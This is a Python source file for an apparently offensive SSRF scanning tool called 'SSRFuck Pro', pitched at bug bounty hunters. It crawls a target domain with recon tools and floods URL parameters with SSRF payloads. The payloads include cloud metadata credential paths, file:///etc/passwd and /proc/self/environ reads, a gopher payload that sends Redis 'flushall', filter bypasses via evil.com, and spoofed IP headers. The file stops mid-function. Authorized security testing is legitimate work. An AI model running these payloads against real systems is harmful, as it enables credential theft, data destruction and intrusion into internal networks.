#!/usr/bin/env python3
"""
SSRFuck Pro - Advanced SSRF Detection for Bug Bounty Hunters
Author: Refactored by GitHub Copilot based on original script
License: MIT
"""

import subprocess
import requests
import re
import os
import json
import time
import sys
import signal
import random
import urllib3
import socket
import argparse
import ipaddress
import hashlib
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urljoin, quote_plus
from typing import List, Dict, Tuple, Set, Optional, Any, Union, Generator
from datetime import datetime
from dataclasses import dataclass, field, asdict
from colorama import init, Fore, Style

# Disable SSL warnings to prevent console spam
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for cross-platform terminal colors
init(autoreset=True)

# Constants for terminal coloring
INFO = f"{Fore.BLUE}[*]{Style.RESET_ALL}"
SUCCESS = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
ERROR = f"{Fore.RED}[-]{Style.RESET_ALL}"
ALERT = f"{Fore.YELLOW}[!]{Style.RESET_ALL}"
VULN = f"{Fore.RED}[VULN]{Style.RESET_ALL}"

# === DATACLASSES FOR STRUCTURED DATA ===
@dataclass
class SSRFResult:
    """Stores results of SSRF testing for better reporting and analysis."""
    url: str
    payload: str
    param: str
    status_code: Optional[int] = None
    response_time: float = 0.0
    content_length: int = 0
    error: str = ""
    suspicious: bool = False
    evidence: List[str] = field(default_factory=list)
    headers_used: Dict[str, str] = field(default_factory=dict)
    hash: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def __post_init__(self):
        # Create unique hash for deduplication
        if not self.hash:
            self.hash = hashlib.md5(f"{self.url}|{self.param}|{self.payload}".encode()).hexdigest()[:10]


# === CONFIGURATION - EXPANDED AND REFINED ===
class SSRFConfig:
    """Configuration for SSRF testing with expanded payloads and parameters."""
    
    # === REFINED SSRF PARAMETER DETECTION ===
    # More comprehensive list of parameters that may lead to SSRF
    SSRF_PARAMS = [
        # Common direct URL parameters
        "url", "uri", "link", "src", "href", "path", "redirect", "return", "next", "goto",
        "redirect_to", "redirect_uri", "callback_url", "return_url", "return_to", "go",
        
        # File and resource loading
        "file", "document", "folder", "root", "page", "feed", "source", "data", 
        "resource", "load", "content", "preview", "view", "download",
        
        # API endpoints and connection params
        "api", "endpoint", "server", "host", "port", "address", "ip", "domain", "site", 
        "service", "location", "region", "zone", "instance", 
        
        # Media related
        "img", "image", "media", "thumbnail", "picture", "audio", "video", "file", "avatar",
        
        # Webhooks and callbacks
        "webhook", "callback", "hook", "subscription", "notify", "notification",
        
        # Less common but exploitable
        "proxy", "dest", "destination", "auth", "open", "navigation", "template", 
        "environment", "target", "base", "referrer", "reference", "ref", "share"
    ]
    
    # Add common parameter prefix/suffix variations
    PARAM_VARIATIONS = []
    for param in SSRF_PARAMS:
        PARAM_VARIATIONS.append(f"{param}_url")
        PARAM_VARIATIONS.append(f"{param}_uri")
        PARAM_VARIATIONS.append(f"{param}_link")
        PARAM_VARIATIONS.append(f"{param}_path")
        PARAM_VARIATIONS.append(f"target_{param}")
        PARAM_VARIATIONS.append(f"remote_{param}")
        PARAM_VARIATIONS.append(f"external_{param}")
        PARAM_VARIATIONS.append(f"{param}_source")
    
    # Combine and deduplicate
    SSRF_PARAMS = sorted(list(set(SSRF_PARAMS + PARAM_VARIATIONS)))
    
    # === PROTOCOL VARIATIONS FOR BYPASS ===
    PROTOCOL_VARIATIONS = [
        "http://",
        "hTtPs://",
        "HtTps:/\\/\\",
        "https:/\\",
        "https:",
        "https:/",
        "https:///",
        "http:////",
        "//",
        "http://\\\\",
        "http:\\\\\\\\",
        "https:/%00/",
        "https:/%0A/",
        "https:/%0D/",
        "http:/%09/",
        "https:/%00/",
        "https:/%0A/",
        "https:/%0D/",
        "http:/%09/",
        "https:/%00/",
        "https:/%0A/",
        "https:/%0D/",
        "http:/%09/"
    ]
    
    # === PAYLOADS - DIVIDED BY CONTEXT & RISK ===
    # Internal Network - Basic
    INTERNAL_HOSTS = [
        "127.0.0.1",
        "localhost",
        "[::1]",            # IPv6 localhost
        "0.0.0.0",
        "127.1",
        "127.0.0.1:80",
        "127.0.0.1:443",
        "127.0.0.1:22",     # SSH
        "127.0.0.1:3306",   # MySQL
        "127.0.0.1:5432",   # PostgreSQL
        "127.0.0.1:6379",   # Redis
        "127.0.0.1:8080",   # Common web services
        "127.0.0.1:8000",   # Common dev ports
        "127.0.0.1:9000",   # Common dev ports
    ]
    
    # Internal Network - Address Obfuscation & Bypass Attempts
    OBFUSCATED_HOSTS = [
        "2130706433",        # Decimal
        "0x7f000001",        # Hex
        "0177.0.0.1",        # Octal
        "0x7f.0.0.1",        # Mixed Hex
        "127.0.0.0x1",       # Mixed Hex octet
        "127.1",             # Short form
        "127.0.1",           # Short form
        "0",                 # Zero
        "0x0",               # Hex Zero
        "0300.0250.0.01",    # Octal form
        "0xc0.0xa8.0x0.0x1", # Full hex form
        "❶②⑦.⓪.⓪.⓪①",       # Unicode trickery (rarely supported)
        "127.0x00.0x00.0x01",# Mixed encoding
        "[::]",              # IPv6 empty
        "127.127.127.127",   # Repeated pattern
        
        # URL encoded forms
        "%31%32%37%2E%30%2E%30%2E%31", # URL encoded
        "127.0.0.1%00",                # Null byte (legacy systems)
        "127.0.0.1%09",                # Tab character
        "127.0.0.1%0A",                # New line
    ]
    
    # Cloud Metadata Service URLs - For Cloud-specific SSRF
    CLOUD_METADATA = [
        # AWS
        "169.254.169.254",
        "169.254.169.254/latest/meta-data/",
        "169.254.169.254/latest/user-data/",
        "169.254.169.254/latest/meta-data/iam/security-credentials/",
        
        # Google Cloud
        "metadata.google.internal/",
        "metadata.google.internal/computeMetadata/v1/",
        "metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        
        # Azure
        "169.254.169.254/metadata/instance",
        "169.254.169.254/metadata/instance?api-version=2021-02-01",
        
        # DigitalOcean
        "169.254.169.254/metadata/v1/",
        
        # Oracle Cloud
        "169.254.169.254/opc/v1/instance/"
    ]
    
    # Protocol Exploits - Advanced SSRF techniques
    PROTOCOL_PAYLOADS = [
        # Gopher Protocol
        "gopher://127.0.0.1:25/xHELO%20localhost",           # SMTP probe
        "gopher://127.0.0.1:80/x%47%45%54%20/%20%48%54%54%50/1.1%0A%0A", # HTTP GET
        "gopher://127.0.0.1:3306/A",                         # MySQL probe
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",   # Redis flush
        
        # File Protocol
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/cmdline",  # Command line arguments
        "file:///proc/self/environ",  # Environment variables
        "file://C:/Windows/win.ini",  # Windows
        
        # Other Protocols
        "dict://127.0.0.1:11211/stats", # Memcached stats
        "ftp://127.0.0.1",
        "tftp://127.0.0.1",
        "ldap://127.0.0.1",
        "http://127.0.0.1:25"      # Direct SMTP
    ]
    
    # Bypass Techniques - For URL Parser Confusion & Bypassing Filters
    FILTER_BYPASS = [
        # Filter bypass with credentials
        "127.0.0.1:80@evil.com",
        "evil.com@127.0.0.1",
        "127.0.0.1#@evil.com",
        "localhost%23@evil.com",
        "evil.com%2F@127.0.0.1",
        
        # Domain and path tricks
        "127.0.0.1/",
        "127.0.0.1:1/",
        "127.0.0.1:80/",
        "127.0.0.1:443/",
        
        # Redirections
        "internal.service/redirect?next=http://127.0.0.1",
        "redirect.com/%2f%2e%2e%2f127.0.0.1",
        
        # DNS rebinding potential payloads
        f"{uuid.uuid4()}.requestrepo.com",  # Random subdomain to bypass DNS pinning
        "attacker-controlled-domain.com"    # Attacker domain for DNS rebinding
    ]
    
    # Dynamically generate some payloads
    DYNAMIC_PAYLOADS = []
    
    # Generate some random internal IPs for testing internal network access
    for _ in range(5):
        ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        DYNAMIC_PAYLOADS.append(ip)
        
    for _ in range(3):
        ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        DYNAMIC_PAYLOADS.append(ip)
        
    for _ in range(2):
        ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        DYNAMIC_PAYLOADS.append(ip)
    
    # === CREATE FINAL PAYLOAD LIST WITH PROTOCOL VARIATIONS ===
    SSRF_PAYLOADS = []
    
    # Base payloads without protocols
    BASE_PAYLOADS = (
        INTERNAL_HOSTS +
        OBFUSCATED_HOSTS + 
        CLOUD_METADATA + 
        DYNAMIC_PAYLOADS
    )
    
    # Apply protocol variations to base payloads
    for payload in BASE_PAYLOADS:
        for protocol in PROTOCOL_VARIATIONS:
            SSRF_PAYLOADS.append(f"{protocol}{payload}")
            
    # Add protocol-specific payloads directly
    SSRF_PAYLOADS.extend(PROTOCOL_PAYLOADS)
    SSRF_PAYLOADS.extend(FILTER_BYPASS)
    
    # === IMPROVED HEADERS FOR BYPASSING PROTECTIONS ===
    # Common headers for SSRF bypass attempts
    SSRF_HEADERS = [
        # Standard IP spoofing headers
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"Host": "127.0.0.1"},
        
        # Cloud-specific headers
        {"X-Forwarded-For": "169.254.169.254"},
        {"X-Forwarded-Host": "metadata.google.internal"},
        {"X-Forwarded-Host": "169.254.169.254"},
        
        # Advanced bypass techniques
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Override-URL": "/admin"},
        {"X-Forwarded-Scheme": "http"},
        {"X-Forwarded-Proto": "http"},
        {"X-Forwarded-Port": "80"},
        {"X-HTTP-Host-Override": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1;host=127.0.0.1;proto=http"},
        
        # Less common but sometimes effective headers
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        
        # Cloud metadata specific headers
        {"Metadata": "true"},  # Azure
        {"Metadata-Flavor": "Google"},  # GCP
        {"X-Metadata-Token": "allowed"},  # Custom
    ]
    
    # Base headers to include in all requests
    HEADERS_BASE = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site"
    }
    
    # === DETECTION PATTERNS ===
    # Patterns to detect successful SSRF in responses
    DETECTION_PATTERNS = [
        # File content patterns
        r"root:.*:0:0:",                      # /etc/passwd
        r"((\d{1,3}\.){3}\d{1,3})\s+.*\slocalhost\s*$",  # /etc/hosts
        
        # Error messages that might indicate SSRF
        r"(ConnectionRefused|timeout|connection refused|EOF|timeout|No route to host)",
        r"(SQLSTATE|mysql|MariaDB|PostgreSQL|DB2)",
        
        # Cloud metadata specific strings
        r"(ami-id|instance-id|instance-type|local-ipv4|public-ipv4|security-credentials)",
        r"(availabilityZone|privateIp|accountId|region|apiVersion)",
        r"(metadata\.google\.internal|metadata\.internal|compute\.internal)",
        r"(azureuser|walinuxagent)",
        
        # Admin-like portal indicators
        r"(admin|dashboard|control panel|management console|login|authentication|authorization)",
        
        # Service specific responses
        r"(memcache|redis|flush|flushall|append|get|set|del|keys)",
        r"(mysql|mysqli|mariadb|postgres|postgresql|oracle|mongodb|firebird)",
        r"(SMTP|HELO|EHLO|MAIL FROM|RCPT TO|DATA|QUIT)",
        r"(ftp|tftp|sftp|ssh|telnet)",
        
        # Successful SSRF indicators
        r"(20\d  ?\w+|OK|Success|Found|Moved|Redirect|Temporary|Index|Directory|File|Access|Permission)",
        
        # Infrastructure exposure
        r"(<title>Index of /|<title>Directory listing for|<h1>Index of /|<h1>Directory listing for)",
        r"(Apache/\d|nginx/\d|Microsoft-IIS/\d|lighttpd/\d)",
        
        # HTML content that should not be in normal responses
        r"(<html|<!doctype|<head|<body|<script|<div|<span|<form|<input|<button)",
        r"</html>|</head>|</body>|</div>|</script>|</form>",
        
        # Special cases - highly indicative of SSRF
        r"request to localhost|forbidden request|disallowed IP|blocked IP|blocked request"
    ]
    
    # === EXTERNAL CALLBACK CONFIGURATION ===
    # For OOB detection - replace with your services
    COLLABORATE_DOMAINS = [
        "burpcollaborator.net",
        "interact.sh",
        "requestrepo.com",
        "webhook.site",
        "canarytokens.com",
    ]


class SSRFScanner:
    """Main SSRF Scanner Class"""
    
    def __init__(self, args):
        """Initialize with command line arguments"""
        self.domain = args.domain
        self.proxy = args.proxy
        self.threads = args.threads
        self.timeout = args.timeout
        self.output_dir = args.output
        self.verify_ssl = not args.no_verify_ssl
        self.delay = args.delay
        self.max_urls = args.max_urls
        self.aggressive = args.aggressive
        self.collaborator = args.collaborator
        self.follow_redirects = args.follow_redirects
        self.cookies = self._parse_cookies(args.cookies)
        self.retries = args.retries
        self.custom_payloads = args.custom_payloads
        
        # Load custom payloads if provided
        if self.custom_payloads:
            self._load_custom_payloads()
            
        # Set up output directory if not exists
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
        # Create result storage
        self.results = []
        self.found_vulnerabilities = []
        self.tested_urls = 0
        self.start_time = time.time()
        
        # Set up signal handlers for graceful exit
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # Setup session
        self.session = requests.Session()
        if self.proxy:
            self.session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }
        
        # Set baseline headers
        self.session.headers.update(SSRFConfig.HEADERS_BASE)
        
        # Add cookies to session if provided
        if self.cookies:
            self.session.cookies.update(self.cookies)
            
        print(f"{INFO} SSRFHunter Pro initialized for target: {Fore.CYAN}{self.domain}{Style.RESET_ALL}")
    
    def _parse_cookies(self, cookie_str):
        """Parse cookies from command line string format"""
        if not cookie_str:
            return {}
            
        cookies = {}
        try:
            for item in cookie_str.split(';'):
                if '=' in item:
                    key, value = item.strip().split('=', 1)
                    cookies[key] = value
            return cookies
        except Exception as e:
            print(f"{ERROR} Failed to parse cookies: {e}")
            return {}
    
    def _load_custom_payloads(self):
        """Load custom SSRF payloads from a file"""
        try:
            if os.path.exists(self.custom_payloads):
                with open(self.custom_payloads, 'r') as f:
                    custom = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    
                print(f"{INFO} Loaded {len(custom)} custom payloads")
                
                # Apply protocol variations to custom payloads
                expanded_payloads = []
                for payload in custom:
                    if "://" not in payload:
                        # If no protocol specified, apply protocol variations
                        for protocol in SSRFConfig.PROTOCOL_VARIATIONS:
                            expanded_payloads.append(f"{protocol}{payload}")
                    else:
                        # If protocol already in payload, use as is
                        expanded_payloads.append(payload)
                
                # Add to main payload list
                SSRFConfig.SSRF_PAYLOADS.extend(expanded_payloads)
                
        except Exception as e:
            print(f"{ERROR} Failed to load custom payloads: {e}")
    
    def _signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{ALERT} Received interrupt signal, saving results and exiting...")
        self._save_results()
        print(f"{SUCCESS} Results saved! Exiting...")
        sys.exit(0)
    
    def run_recon(self):
        """Collect URLs from target domain using various tools"""
        print(f"{INFO} Starting reconnaissance for {self.domain}...")
        urls = set()
        
        try:
            # Try using gau (GetAllUrls) 
            print(f"{INFO} Running gau...")
            try:
                gau_output = subprocess.check_output(
                    ["gau", self.domain], 
                    stderr=subprocess.DEVNULL, 
                    timeout=60
                ).decode()
                gau_urls = set([u.strip() for u in gau_output.splitlines() if "=" in u])
                print(f"{SUCCESS} Found {len(gau_urls)} URLs with gau")
                urls.update(gau_urls)
            except subprocess.TimeoutExpired:
                print(f"{ERROR} gau timed out after 60 seconds")
            except FileNotFoundError:
                print(f"{ALERT} gau not found, skipping... Install with 'go install github.com/lc/gau/v2/cmd/gau@latest'")
            except Exception as e:
                print(f"{ERROR} Error running gau: {e}")
        
            # Try using waybackurls
            print(f"{INFO} Running waybackurls...")
            try:
                wayback_output = subprocess.check_output(
                    ["waybackurls", self.domain], 
                    stderr=subprocess.DEVNULL,
                    timeout=60
                ).decode()
                wayback_urls = set([u.strip() for u in wayback_output.splitlines() if "=" in u])
                print(f"{SUCCESS} Found {len(wayback_urls)} URLs with waybackurls")
                urls.update(wayback_urls)
            except subprocess.TimeoutExpired:
                print(f"{ERROR} waybackurls timed out after 60 seconds")
            except FileNotFoundError:
                print(f"{ALERT} waybackurls not found, skipping... Install with 'go install github.com/tomnomnom/waybackurls@latest'")
            except Exception as e:
                print(f"{ERROR} Error running waybackurls: {e}")
                
            # Try using katana for crawling
            print(f"{INFO} Running katana...")
            try:
                katana_output = subprocess.check_output(
                    ["katana", "-u", f"https://{self.domain}", "-silent"], 
                    stderr=subprocess.DEVNULL,
                    timeout=120
                ).decode()
                katana_urls = set([u.strip() for u in katana_output.splitlines() if "=" in u])
                print(f"{SUCCESS} Found {len(katana_urls)} URLs with katana")
                urls.update(katana_urls)
            except subprocess.TimeoutExpired:
                print(f"{ERROR} katana timed out after 120 seconds")
            except FileNotFoundError:
                print(f"{ALERT} katana not found, skipping... Install with 'go install github.com/projectdiscovery/katana/cmd/katana@latest'")
            except Exception as e:
                print(f"{ERROR} Error running katana: {e}")
            
            # Try using httpx for probing
            if self.domain.startswith(('http://', 'https://')):
                target = self.domain
            else:
                target = f"https://{self.domain}"
            
            print(f"{INFO} Probing target with httpx...")
            try:
                httpx_output = subprocess.check_output(
                    ["httpx", "-u", target, "-path", "/", "-silent"], 
                    stderr=subprocess.DEVNULL,
                    timeout=30
                ).decode()
                if httpx_output.strip():
                    # Add basic endpoints for common parameters
                    for param in random.sample(SSRFConfig.SSRF_PARAMS, min(30, len(SSRFConfig.SSRF_PARAMS))):
                        urls.add(f"{httpx_output.strip()}?{param}=https://example.com")
            except subprocess.TimeoutExpired:
                print(f"{ERROR} httpx timed out after 30 seconds")
            except FileNotFoundError:
                print(f"{ALERT} httpx not found, skipping... Install with 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest'")
            except Exception as e:
                print(f"{ERROR} Error running httpx: {e}")
                
            # Try alternative approach if no tools found
            if len(urls) == 0:
                print(f"{ALERT} No recon tools found or they found no URLs. Trying direct requests...")
                
                # Add common paths with SSRF parameters
                for path in ['/', '/api/', '/redirect/', '/proxy/', '/fetch/', '/load/', '/go/']:
                    for param in random.sample(SSRFConfig.SSRF_PARAMS, min(5, len(SSRFConfig.SSRF_PARAMS))):
                        if self.domain.startswith(('http://', 'https://')):
                            urls.add(f"{self.domain}{path}?{param}=https://example.com")
                        else:
                            urls.add(f"https://{self.domain}{path}?{param}=https://example.com")
        
        except Exception as e:
            print(f"{ERROR} Error during reconnaissance: {e}")
            
        if self.max_urls and len(urls) > self.max_urls:
            print(f"{INFO} Limiting to {self.max_urls} URLs from {len(urls)} total")
            urls_list = list(urls)
            random.shuffle(urls_list)
            return urls_list[:self.max_urls]
            
        total_urls = len(urls)
        print(f"{SUCCESS} Reconnaissance complete! Found {total_urls} unique URLs to test")
        return list(urls)
    
    def filter_ssrf_urls(self, urls):
        """Filter URLs to keep only those with potential SSRF parameters"""
        pattern = re.compile("|".join(SSRFConfig.SSRF_PARAMS), re.IGNORECASE)
        filtered_urls = [u for u in urls if pattern.search(u)]
        
        print(f"{INFO} Filtered {len(filtered_urls)} URLs with SSRF-related parameters from {len(urls)} total")
        return filtered_urls
    
    def build_url_with_payload(self, base_url, param, payload):
        """Build a URL with the SSRF payload injected into the specified parameter"""
        try:
            parsed = urlparse(base_url)
            query_params = parse_qs(parsed.query)
            
            # If parameter exists in URL, replace it
            if param in query_params:
                # Get all query parameters
                query_pairs = []
                for key, values in query_params.items():
                    if key == param:
                        query_pairs.append(f"{key}={quote_plus(payload)}")
                    else:
                        for value in values:
                            query_pairs.append(f"{key}={quote_plus(value)}")
                
                query_string = "&".join(query_pairs)
                
                # Reconstruct the URL
                new_url = parsed._replace(query=query_string).geturl()
                return new_url
            else:
                # Parameter doesn't exist, append it
                sep = "&" if parsed.query else "?"
                return f"{base_url}{sep}{param}={quote_plus(payload)}"
        except Exception as e:
            print(f"{ERROR} Error building URL {base_url} with param {param}: {e}")
            # Fallback to simple concatenation
            sep = "&" if "?" in base_url else "?"
            return f"{base_url}{sep}{param}={quote_plus(payload)}"
    
    def extract_params_from_url(self, url):
        """Extract parameters from URL that could be exploited for SSRF"""
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            # Find potential SSRF parameters
            ssrf_params = []
            pattern = re.compile("|".join(SSRFConfig.SSRF_PARAMS), re.IGNORECASE)
            
            for param in query_params.keys():
                if pattern.search(param):
                    ssrf_params.append(param)
                    
            return ssrf_params
        except Exception as e:
            print(f"{ERROR} Error extracting parameters from {url}: {e}")
            return []
    
    def test_url(self, url, param, payload, headers_override=None):
        """Test a URL for SSRF vulnerability using the specified payload"""
        full_url = self.build_url_with_payload(url, param, payload)
        
        # Combine base headers with any overrides
        headers = SSRFConfig.HEADERS_BASE.copy()
        if headers_override:
            headers.update(headers_override)
            
        result = SSRFResult(
            url=url,
            payload=payload,
            param=param,
        )
        
        try:
            # Respecting delay if specified
            if self.delay > 0:
                time.sleep(self.delay)
                
            # Make the request with retry logic
            for attempt in range(self.retries + 1):
                try:
                    start_time = time.time()
                    response = self.session.get(
                        full_url, 
                        headers=headers,
                        timeout=self.timeout,
                        allow_redirects=self.follow_redirects,
                        verify=self.verify_ssl
                    )
                    elapsed_time = time.time() - start_time
                    
                    # Record data about response
                    result.status_code = response.status_code
                    result.response_time = round(elapsed_time, 3)
                    result.content_length = len(response.content)
                    result.headers_used = headers_override or {}
                    
                    # Check for potential indicators of SSRF
                    response_body = response.text.lower()
                    response_headers = str(response.headers).lower()
                    
                    # Check for patterns that indicate successful SSRF
                    for pattern in SSRFConfig.DETECTION_PATTERNS:
                        matches = re.search(pattern, response.text, re.IGNORECASE)
                        if matches:
                            result.suspicious = True
                            evidence = matches.group(0)
                            result.evidence.append(f"Pattern match: {evidence}")
                    
                    # Look for specific status codes
                    if response.status_code in [200, 301, 302]:
                        # Interesting status code, especially for redirects with cloud metadata
                        if "metadata" in payload.lower() and "cloud" in response_body:
                            result.suspicious = True
                            result.evidence.append(f"Cloud metadata potentially leaked: Status {response.status_code}")
                            
                    # Check for error messages that might reveal SSRF vulnerability
                    error_patterns = [
                        "timeout", "connection refused", "route to host", 
                        "network is unreachable", "connection timed out",
                        "couldn't connect", "connection error"
                    ]
                    
                    for error in error_patterns:
                        if error in response_body or error in response_headers:
                            result.evidence.append(f"Error indicator: {error}")
                            result.suspicious = True
                            break
                            
                    # Check for unusual response times
                    if (elapsed_time > 5.0 and "127.0.0.1" in payload) or (elapsed_time > 10.0):
                        result.evidence.append(f"Unusual response time: {elapsed_time}s")
                        result.suspicious = True
                    
                    # Break the retry loop on success
                    break
                    
                except requests.exceptions.Timeout:
                    if attempt < self.retries:
                        time.sleep(1)  # Wait before retry
                        continue
                    result.error = f"Timeout after {self.timeout}s"
                    # Timeouts can be interesting, especially for localhost payloads
                    if "127.0.0.1" in payload or "localhost" in payload:
                        result.suspicious = True
                        result.evidence.append(f"Timeout with localhost payload")
                        
                except requests.exceptions.SSLError as e:
                    if attempt < self.retries:
                        time.sleep(1)  # Wait before retry
                        continue
                    result.error = f"SSL Error: {str(e)}"
                    
                except requests.exceptions.ConnectionError as e:
                    if attempt < self.retries:
                        time.sleep(1)  # Wait before retry
                        continue
                    result.error = f"Connection Error: {str(e)}"
                    # Connection errors can indicate firewall blocks or filtering
                    if "127.0.0.1" in payload or "localhost" in payload:
                        result.suspicious = True
                        result.evidence.append(f"Connection error with localhost payload: {str(e)}")
                        
                except Exception as e:
                    if attempt < self.retries:
                        time.sleep(1)  # Wait before retry
                        continue
                    result.error = f"Error: {str(e)}"
        
        except Exception as e:
            result.error = f"Unexpected error: {str(e)}"
            
        # Add timestamp for when the test was completed
        result.timestamp = datetime.now().isoformat()
        
        return result
    
    def generate_collaborator_url(self):
        """Generate a unique URL for OOB testing"""
        if not self.collaborator:
            return None
            
        # Using the collaborator domain specified
        random_id = str(uuid.uuid4()).replace('-', '')[:10]
        if self.collaborator.endswith('/'):
            self.collaborator = self.collaborator[:-1]
            
        return f"{self.collaborator}/{random_id}"
    
    def bruteforce_ssrf(self, urls):
        """Main method to test URLs for SSRF vulnerabilities"""
        print(f"{INFO} Starting SSRF tests on {len(urls)} URLs with {len(SSRFConfig.SSRF_PAYLOADS)} payloads...")
        print(f"{INFO} Using {self.threads} threads, timeout={self.timeout}s, retries={self.retries}")
        
        if self.collaborator:
            print(f"{INFO} Using collaborator for OOB detection: {self.collaborator}")
        
        total_tests = len(urls) * len(SSRFConfig.SSRF_PARAMS) * len(SSRFConfig.SSRF_PAYLOADS) * len(SSRFConfig.SSRF_HEADERS)
        print(f"{INFO} Maximum theoretical tests: {total_tests:,} (will be fewer in practice)")
        
        start_time = time.time()
        tests_completed = 0
        results = []
        
        # Set up progress tracking
        last_update_time = time.time()
        update_interval = 3  # seconds
                
        def test_payload_on_param(url, param, payload_idx):
            """Test a single SSRF payload on a specific parameter"""
            nonlocal tests_completed
            
            # Track progress periodically
            nonlocal last_update_time
            current_time = time.time()
            
            payload = SSRFConfig.SSRF_PAYLOADS[payload_idx]
            
            # Generate OOB payload if collaborator is specified
            if self.collaborator and payload_idx % 10 == 0:  # Only use collaborator for some payloads
                oob_url = self.generate_collaborator_url()
                if oob_url:
                    payload = oob_url
            
            # Test with different header combinations
            tested_results = []
            
            # Always test with default headers first
            result = self.test_url(url, param, payload)
            tested_results.append(result)
            tests_completed += 1
            
            # If aggressive mode, try with different headers
            if self.aggressive:
                # Try with different header combinations
                for headers in SSRFConfig.SSRF_HEADERS:
                    result = self.test_url(url, param, payload, headers)
                    tested_results.append(result)
                    tests_completed += 1
            else:
                # In non-aggressive mode, only try a few headers for suspicious results
                if result.suspicious:
                    # Only test with a couple headers on promising payloads
                    sampled_headers = random.sample(
                        SSRFConfig.SSRF_HEADERS, 
                        min(3, len(SSRFConfig.SSRF_HEADERS))
                    )
                    for headers in sampled_headers:
                        result = self.test_url(url, param, payload, headers)
                        tested_results.append(result)
                        tests_completed += 1
            
            # Print progress update
            if current_time - last_update_time >= update_interval:
                elapsed = current_time - start_time
                rate = tests_completed / elapsed if elapsed > 0 else 0
                eta = (total_tests - tests_completed) / rate if rate > 0 else 0
                
                print(f"\r{INFO} Progress: {tests_completed:,}/{total_tests:,} tests "
                      f"({tests_completed/total_tests*100:.1f}%) "
                      f"Rate: {rate:.1f} req/s "
                      f"ETA: {eta/60:.1f}m ", end="")
                
                last_update_time = current_time
                
                # Save intermediate results occasionally
                if tests_completed % 1000 == 0:
                    self._save_results()
            
            return tested_results
        
        def test_url_parameters(url):
            """Extract parameters from a URL and test each one"""
            url_results = []
            
            # Extract potential SSRF parameters from the URL
            params = self.extract_params_from_url(url)
            
            if not params:
                # If no SSRF parameters found in URL, try common ones
                params = random.sample(
                    SSRFConfig.SSRF_PARAMS, 
                    min(5, len(SSRFConfig.SSRF_PARAMS))
                )
            
            # For each parameter, test with selected payloads
            for param in params:
                # In non-aggressive mode, sample payloads
                if self.aggressive:
                    payload_indices = list(range(len(SSRFConfig.SSRF_PAYLOADS)))
                else:
                    # Sample a subset of payloads in non-aggressive mode
                    payload_indices = random.sample(
                        range(len(SSRFConfig.SSRF_PAYLOADS)), 
                        min(20, len(SSRFConfig.SSRF_PAYLOADS))
                    )
                
                for payload_idx in payload_indices:
                    results = test_payload_on_param(url, param, payload_idx)
                    url_results.extend(results)
                    
                    # If we find something suspicious, test more payloads
                    if any(r.suspicious for r in results):
                        # Test a few more payloads
                        extra_payload_indices = random.sample(
                            [i for i in range(len(SSRFConfig.SSRF_PAYLOADS)) if i not in payload_indices],
                            min(10, len(SSRFConfig.SSRF_PAYLOADS) - len(payload_indices))
                        )
                        for extra_idx in extra_payload_indices:
                            extra_results = test_payload_on_param(url, param, extra_idx)
                            url_results.extend(extra_results)
            
            return url_results
        
        # Use ThreadPoolExecutor to parallelize testing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {executor.submit(test_url_parameters, url): url for url in urls}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    url_results = future.result()
                    results.extend(url_results)
                    
                    # Extract and highlight suspicious results
                    suspicious_results = [r for r in url_results if r.suspicious]
                    if suspicious_results:
                        self.found_vulnerabilities.extend(suspicious_results)
                        
                        print(f"\n{VULN} Potential SSRF found in {url}!")
                        for i, result in enumerate(suspicious_results[:3]):  # Show top 3 suspicious results
                            print(f"  - Param: {result.param}, Payload: {result.payload}")
                            print(f"    Status: {result.status_code}, Evidence: {', '.join(result.evidence[:2])}")
                        
                        if len(suspicious_results) > 3:
                            print(f"    ... and {len(suspicious_results) - 3} more suspicious results")
                            
                except Exception as e:
                    print(f"\n{ERROR} Error testing {url}: {e}")
        
        # Save final results
        self.results = results
        self._save_results()
        
        # Final statistics
        elapsed_time = time.time() - start_time
        print(f"\n{SUCCESS} SSRF testing complete!")
        print(f"  - Tested {len(urls)} URLs")
        print(f"  - Completed {tests_completed:,} tests in {elapsed_time:.1f}s ({tests_completed/elapsed_time:.1f} req/s)")
        print(f"  - Found {len(self.found_vulnerabilities)} potentially vulnerable endpoints")
        
        # Output report path
